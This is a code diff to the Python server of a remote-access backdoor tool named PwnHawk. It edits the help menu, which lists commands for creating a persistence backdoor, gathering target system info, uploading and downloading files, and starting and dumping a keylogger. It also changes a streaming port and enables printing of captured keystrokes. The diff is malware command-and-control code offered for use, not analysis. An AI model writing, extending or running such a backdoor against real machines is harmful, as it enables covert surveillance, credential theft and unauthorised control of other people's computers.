@@ -18,7 +18,7 @@ class Server:
 		self.c_sockets = []
 		self.c_addrs = []
 		self.terminate_ac = False
-		self.stream_reciever = StreamingServer(self.__lhost, 7777)
+		self.stream_reciever = StreamingServer(self.__lhost, 8532)
 		self.__start_server()
 
 
@@ -29,8 +29,6 @@ class Server:
 
 {colored("CORE COMMANDS:", "magenta")}
 	    {colored("help", "cyan")}                     --> show this help on how to use PwnHawk.
-	    {colored("check_privs", "cyan")}              --> check to see if the backdoor is running with administrative
-	                              privileges.
 	    {colored("sysinfo", "cyan")}                  --> get target system information.
 	    {colored("create_persist", "cyan")}           --> create a persistace backdoor if it doesn't exitsts.
 	    {colored("quit", "cyan")}                     --> kill the current session.
@@ -39,7 +37,7 @@ class Server:
 {colored("WORKING WITH FILES:", "magenta")}
 	    {colored("dir", "cyan")}                      --> list files in the current working directory.
 	    {colored("mkdir", "cyan")} [{colored("dir name","green")}]         --> create a folder on the target system.
-	    {colored("cd", "cyan")} [{colored("directory name","green")}]      --> change the current working directory to a specifie
+	    {colored("cd", "cyan")} [{colored("directory name","green")}]      --> change the current working directory to a specified dir,
 	                              directory.
 	    {colored("upload", "cyan")} [{colored("file path","green")}]       --> upload the specified filename to the target system.
 	    {colored("download", "cyan")} [{colored("filename","green")}]      --> donwload specified filename from the target system.
@@ -215,7 +213,7 @@ class Server:
 			elif cmd == "start_keycap":
 				pass
 			elif cmd == "dump_keycap":
-				#print(self.reliable_recv(c_socket))
+				print(self.reliable_recv(c_socket))
 				pass
 			elif cmd == "stop_keycap":
 				pass
